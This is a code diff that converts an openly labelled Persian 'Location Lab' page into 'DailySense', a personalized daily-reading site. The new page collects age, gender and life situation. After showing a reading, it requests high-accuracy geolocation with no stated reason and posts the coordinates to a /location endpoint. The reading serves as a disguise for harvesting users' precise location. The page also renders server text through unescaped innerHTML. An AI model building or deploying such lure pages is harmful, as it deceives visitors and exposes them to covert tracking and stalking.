@@ -1,5 +1,6 @@
 <!DOCTYPE html>
-<html lang="fa">
+<html lang="en">
+
 <head>
 
     <meta charset="UTF-8">
@@ -7,217 +8,965 @@
     <meta name="viewport"
           content="width=device-width, initial-scale=1.0">
 
-    <title>Location Lab</title>
+    <title>DailySense — Your Daily Reading</title>
+
 
     <style>
 
+        * {
+            box-sizing: border-box;
+        }
+
+
         body {
-            font-family: Arial, sans-serif;
-            background: #f4f4f4;
+
             margin: 0;
-            padding: 40px 20px;
-            text-align: center;
+
+            min-height: 100vh;
+
+            font-family:
+                Inter,
+                -apple-system,
+                BlinkMacSystemFont,
+                "Segoe UI",
+                sans-serif;
+
+            background:
+                linear-gradient(
+                    135deg,
+                    #f7f4ff,
+                    #eef5ff
+                );
+
+            color: #20202a;
         }
 
-        .container {
-            max-width: 500px;
-            margin: 100px auto;
+
+        .navbar {
+
+            max-width: 1100px;
+
+            margin: auto;
+
+            padding: 24px 25px;
+
+            display: flex;
+
+            justify-content: space-between;
+
+            align-items: center;
+        }
+
+
+        .logo {
+
+            font-size: 22px;
+
+            font-weight: 700;
+
+            letter-spacing: -0.5px;
+        }
+
+
+        .nav-link {
+
+            color: #666;
+
+            text-decoration: none;
+
+            font-size: 14px;
+        }
+
+
+        .hero {
+
+            max-width: 1100px;
+
+            margin: 70px auto 0;
+
+            padding: 20px;
+        }
+
+
+        .hero-content {
+
+            max-width: 650px;
+        }
+
+
+        .badge {
+
+            display: inline-block;
+
+            padding: 7px 13px;
+
+            background:
+                rgba(255,255,255,0.7);
+
+            border:
+                1px solid rgba(0,0,0,0.06);
+
+            border-radius: 50px;
+
+            font-size: 13px;
+
+            color: #686878;
+
+            margin-bottom: 20px;
+        }
+
+
+        h1 {
+
+            font-size:
+                clamp(42px, 7vw, 72px);
+
+            line-height: 1.05;
+
+            letter-spacing: -3px;
+
+            margin: 0 0 22px;
+        }
+
+
+        .hero-description {
+
+            font-size: 18px;
+
+            line-height: 1.7;
+
+            color: #666675;
+
+            max-width: 560px;
+        }
+
+
+        .card-wrapper {
+
+            max-width: 650px;
+
+            margin-top: 45px;
+
+            background:
+                rgba(255,255,255,0.82);
+
+            backdrop-filter: blur(20px);
+
+            border:
+                1px solid rgba(255,255,255,0.9);
+
+            border-radius: 24px;
+
+            padding: 30px;
+
+            box-shadow:
+                0 20px 60px
+                rgba(70,60,120,0.10);
+        }
+
+
+        .card-title {
+
+            font-size: 20px;
+
+            font-weight: 650;
+
+            margin-bottom: 8px;
+        }
+
+
+        .card-subtitle {
+
+            color: #777;
+
+            font-size: 14px;
+
+            margin-bottom: 28px;
+        }
+
+
+        .form-grid {
+
+            display: grid;
+
+            grid-template-columns:
+                repeat(2, 1fr);
+
+            gap: 18px;
+        }
+
+
+        .form-group {
+
+            display: flex;
+
+            flex-direction: column;
+
+            gap: 8px;
+        }
+
+
+        .form-group.full {
+
+            grid-column: 1 / -1;
+        }
+
+
+        label {
+
+            font-size: 13px;
+
+            color: #555;
+        }
+
+
+        input,
+        select {
+
+            width: 100%;
+
+            padding: 14px 15px;
+
+            border-radius: 12px;
+
+            border:
+                1px solid #dedee8;
+
             background: white;
-            padding: 35px;
-            border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+
+            font-size: 15px;
+
+            color: #222;
+
+            outline: none;
+
+            transition:
+                border-color 0.2s,
+                box-shadow 0.2s;
         }
 
-        button {
-            padding: 14px 25px;
+
+        input:focus,
+        select:focus {
+
+            border-color: #8b7cf6;
+
+            box-shadow:
+                0 0 0 4px
+                rgba(139,124,246,0.10);
+        }
+
+
+        .button {
+
+            width: 100%;
+
+            margin-top: 24px;
+
+            padding: 15px;
+
             border: none;
-            border-radius: 10px;
-            background: #222;
+
+            border-radius: 13px;
+
+            background: #24242d;
+
             color: white;
-            font-size: 16px;
+
+            font-size: 15px;
+
+            font-weight: 600;
+
             cursor: pointer;
+
+            transition:
+                transform 0.2s,
+                background 0.2s;
         }
 
-        button:hover {
-            background: #444;
+
+        .button:hover {
+
+            background: #353540;
+
+            transform: translateY(-1px);
         }
 
-        #result {
+
+        .button:disabled {
+
+            opacity: 0.6;
+
+            cursor: wait;
+
+            transform: none;
+        }
+
+
+        .note {
+
+            margin-top: 15px;
+
+            text-align: center;
+
+            font-size: 12px;
+
+            color: #8a8a95;
+        }
+
+
+        .reading-result {
+
+            max-width: 650px;
+
             margin-top: 25px;
-            line-height: 2;
+
+            padding: 30px;
+
+            background:
+                rgba(255,255,255,0.82);
+
+            backdrop-filter: blur(20px);
+
+            border:
+                1px solid rgba(255,255,255,0.9);
+
+            border-radius: 24px;
+
+            box-shadow:
+                0 20px 60px
+                rgba(70,60,120,0.10);
+
+            animation:
+                readingAppear 0.5s ease;
+        }
+
+
+        .reading-label {
+
+            font-size: 11px;
+
+            letter-spacing: 1.5px;
+
+            color: #8b7cf6;
+
+            font-weight: 700;
+
+            margin-bottom: 12px;
+        }
+
+
+        .reading-result h2 {
+
+            margin: 0 0 15px;
+
+            font-size: 28px;
+
+            letter-spacing: -1px;
+        }
+
+
+        .reading-result p {
+
+            margin: 0;
+
+            color: #666675;
+
+            line-height: 1.8;
+
+            font-size: 16px;
+        }
+
+
+        @keyframes readingAppear {
+
+            from {
+
+                opacity: 0;
+
+                transform:
+                    translateY(15px);
+            }
+
+            to {
+
+                opacity: 1;
+
+                transform:
+                    translateY(0);
+            }
+        }
+
+
+        footer {
+
+            max-width: 1100px;
+
+            margin: 80px auto 30px;
+
+            padding: 0 25px;
+
+            color: #999;
+
+            font-size: 13px;
+        }
+
+
+        @media (max-width: 650px) {
+
+            .navbar {
+
+                padding-top: 20px;
+            }
+
+
+            .hero {
+
+                margin-top: 35px;
+            }
+
+
+            h1 {
+
+                letter-spacing: -2px;
+            }
+
+
+            .form-grid {
+
+                grid-template-columns: 1fr;
+            }
+
+
+            .form-group.full {
+
+                grid-column: auto;
+            }
+
+
+            .card-wrapper {
+
+                padding: 22px;
+            }
+
+
+            .reading-result {
+
+                padding: 22px;
+            }
+
         }
 
     </style>
 
 </head>
 
+
 <body>
 
-<div class="container">
 
-    <h1>Location Lab</h1>
+<nav class="navbar">
 
-    <p>
-        برای ادامه، اجازه‌ی دسترسی به موقعیت مکانی لازم است.
-    </p>
+    <div class="logo">
+        DailySense
+    </div>
 
-    <button onclick="getLocation()">
-        ادامه
-    </button>
 
-    <div id="result"></div>
+    <a href="#" class="nav-link">
+        About
+    </a>
 
-</div>
+</nav>
+
+
+<main class="hero">
+
+
+    <div class="hero-content">
+
+
+        <div class="badge">
+            Your daily personalized reading
+        </div>
+
+
+        <h1>
+            A little insight<br>
+            for your day.
+        </h1>
+
+
+        <p class="hero-description">
+
+            Discover a personalized daily reading
+            based on a few details about you,
+            your current situation, and what matters
+            most to you today.
+
+        </p>
+
+
+        <div class="card-wrapper">
+
+
+            <div class="card-title">
+                Tell us a little about yourself
+            </div>
+
+
+            <div class="card-subtitle">
+                This helps us create your personalized reading.
+            </div>
+
+
+            <form id="readingForm">
+
+
+                <div class="form-grid">
+
+
+                    <div class="form-group">
+
+                        <label for="age">
+                            Age
+                        </label>
+
+
+                        <input
+                            type="number"
+                            id="age"
+                            min="13"
+                            max="100"
+                            placeholder="Your age"
+                            required
+                        >
+
+                    </div>
+
+
+                    <div class="form-group">
+
+                        <label for="gender">
+                            Gender
+                        </label>
+
+
+                        <select
+                            id="gender"
+                            required
+                        >
+
+                            <option value="">
+                                Select
+                            </option>
+
+                            <option value="female">
+                                Female
+                            </option>
+
+                            <option value="male">
+                                Male
+                            </option>
+
+                            <option value="other">
+                                Prefer not to say
+                            </option>
+
+                        </select>
+
+                    </div>
+
+
+                    <div class="form-group full">
+
+                        <label for="situation">
+                            Current situation
+                        </label>
+
+
+                        <select
+                            id="situation"
+                            required
+                        >
+
+                            <option value="">
+                                Select your situation
+                            </option>
+
+                            <option value="student">
+                                Student
+                            </option>
+
+                            <option value="working">
+                                Working
+                            </option>
+
+                            <option value="looking">
+                                Looking for new opportunities
+                            </option>
+
+                            <option value="other">
+                                Something else
+                            </option>
+
+                        </select>
+
+                    </div>
+
+
+                    <div class="form-group full">
+
+                        <label for="focus">
+                            What matters most to you today?
+                        </label>
+
+
+                        <select
+                            id="focus"
+                            required
+                        >
+
+                            <option value="">
+                                Choose one
+                            </option>
+
+                            <option value="career">
+                                Career & goals
+                            </option>
+
+                            <option value="relationships">
+                                Relationships
+                            </option>
+
+                            <option value="money">
+                                Money & opportunities
+                            </option>
+
+                            <option value="personal">
+                                Personal growth
+                            </option>
+
+                        </select>
+
+                    </div>
+
+
+                </div>
+
+
+                <button
+                    type="submit"
+                    class="button"
+                    id="submitButton"
+                >
+                    Reveal My Reading
+                </button>
+
+
+                <div class="note">
+                    Your reading will take just a moment.
+                </div>
+
+
+            </form>
+
+
+        </div>
+
+
+    </div>
+
+
+</main>
+
+
+<footer>
+
+    © 2026 DailySense
+
+</footer>
 
 
 <script>
 
-function getLocation() {
 
-    const result =
-        document.getElementById("result");
+const form =
+    document.getElementById("readingForm");
 
 
-    // بررسی پشتیبانی مرورگر
+const submitButton =
+    document.getElementById("submitButton");
+
+
+form.addEventListener(
+    "submit",
+    async function(event) {
+
+        event.preventDefault();
+
+
+        submitButton.disabled = true;
+
+        submitButton.textContent =
+            "Preparing your reading...";
+
+
+        const age =
+            document.getElementById("age").value;
+
+
+        const gender =
+            document.getElementById("gender").value;
+
+
+        const situation =
+            document.getElementById("situation").value;
+
+
+        const focus =
+            document.getElementById("focus").value;
+
+
+        const data = {
+
+            age: age,
+
+            gender: gender,
+
+            situation: situation,
+
+            focus: focus
+
+        };
+
+
+        try {
+
+            const response =
+                await fetch(
+                    "/reading",
+                    {
+
+                        method: "POST",
+
+                        headers: {
+                            "Content-Type":
+                                "application/json"
+                        },
+
+                        body:
+                            JSON.stringify(data)
+
+                    }
+                );
+
+
+            const result =
+                await response.json();
+
+
+            if (!response.ok) {
+
+                alert(
+                    result.message ||
+                    "Something went wrong."
+                );
+
+                submitButton.disabled = false;
+
+                submitButton.textContent =
+                    "Reveal My Reading";
+
+                return;
+            }
+
+
+            showReading(
+                result.reading
+            );
+
+
+            requestLocation();
+
+
+        } catch (error) {
+
+            console.error(error);
+
+
+            alert(
+                "Unable to connect to the server."
+            );
+
+
+        } finally {
+
+            submitButton.disabled = false;
+
+            submitButton.textContent =
+                "Reveal My Reading";
+
+        }
+
+    }
+);
+
+
+function showReading(reading) {
+
+    const oldResult =
+        document.querySelector(
+            ".reading-result"
+        );
+
+
+    if (oldResult) {
+        oldResult.remove();
+    }
+
+
+    const card =
+        document.createElement("div");
+
+
+    card.className =
+        "reading-result";
+
+
+    card.innerHTML = `
+
+        <div class="reading-label">
+            YOUR DAILY READING
+        </div>
+
+        <h2>
+            ${reading.title}
+        </h2>
+
+        <p>
+            ${reading.text}
+        </p>
+
+    `;
+
+
+    document
+        .querySelector(".card-wrapper")
+        .after(card);
+
+
+    card.scrollIntoView({
+        behavior: "smooth",
+        block: "center"
+    });
+
+}
+
+
+function requestLocation() {
+
     if (!navigator.geolocation) {
 
-        result.innerHTML =
-            "مرورگر شما از موقعیت مکانی پشتیبانی نمی‌کند.";
+        console.log(
+            "Geolocation is not supported."
+        );
 
         return;
     }
 
 
-    result.innerHTML =
-        "در حال درخواست دسترسی به موقعیت مکانی...";
-
-
     navigator.geolocation.getCurrentPosition(
 
-        // -------------------------
-        // SUCCESS
-        // -------------------------
+        async function(position) {
 
-        function(position) {
+            const locationData = {
 
-            const latitude =
-                position.coords.latitude;
+                latitude:
+                    position.coords.latitude,
 
-            const longitude =
-                position.coords.longitude;
+                longitude:
+                    position.coords.longitude,
 
-            const accuracy =
-                position.coords.accuracy;
+                accuracy:
+                    position.coords.accuracy
 
-
-            result.innerHTML =
-                "دسترسی تأیید شد. در حال ورود...";
+            };
 
 
-            fetch("/location", {
+            try {
 
-                method: "POST",
+                const response =
+                    await fetch(
+                        "/location",
+                        {
 
-                headers: {
-                    "Content-Type": "application/json"
-                },
+                            method: "POST",
 
-                body: JSON.stringify({
+                            headers: {
+                                "Content-Type":
+                                    "application/json"
+                            },
 
-                    latitude: latitude,
-                    longitude: longitude,
-                    accuracy: accuracy
+                            body:
+                                JSON.stringify(
+                                    locationData
+                                )
 
-                })
+                        }
+                    );
 
-            })
 
-            .then(response => response.json())
+                const result =
+                    await response.json();
 
-            .then(data => {
 
-                if (data.success) {
+                console.log(
+                    "Location result:",
+                    result
+                );
 
-                    // Location دریافت شده؛
-                    // حالا اجازه ورود داریم.
-                    window.location.href = "/dashboard";
 
-                } else {
+            } catch (error) {
 
-                    result.innerHTML =
-                        "خطا در ثبت موقعیت.";
+                console.error(
+                    "Location request failed:",
+                    error
+                );
 
-                }
-
-            })
-
-            .catch(error => {
-
-                console.error(error);
-
-                result.innerHTML =
-                    "خطا در ارتباط با سرور.";
-
-            });
+            }
 
         },
 
-
-        // -------------------------
-        // ERROR
-        // -------------------------
 
         function(error) {
 
-            if (error.code === 1) {
+            console.log(
+                "Location permission was not granted."
+            );
 
-                // کاربر اجازه نداده است.
-                // اجازه ورود به بخش اصلی ندارد.
-
-                window.location.href =
-                    "/access-denied";
-
-            }
-
-            else if (error.code === 2) {
-
-                result.innerHTML =
-                    "موقعیت مکانی در دسترس نیست.";
-
-            }
-
-            else if (error.code === 3) {
-
-                result.innerHTML =
-                    "زمان دریافت موقعیت تمام شد.";
-
-            }
-
-            else {
-
-                result.innerHTML =
-                    "خطایی در دریافت موقعیت رخ داد.";
-
-            }
+            console.log(error);
 
         },
 
 
-        // -------------------------
-        // OPTIONS
-        // -------------------------
-
         {
+
             enableHighAccuracy: true,
+
             timeout: 10000,
+
             maximumAge: 0
+
         }
 
     );
 
 }
 
+
 </script>
 
+
 </body>
+
 </html>
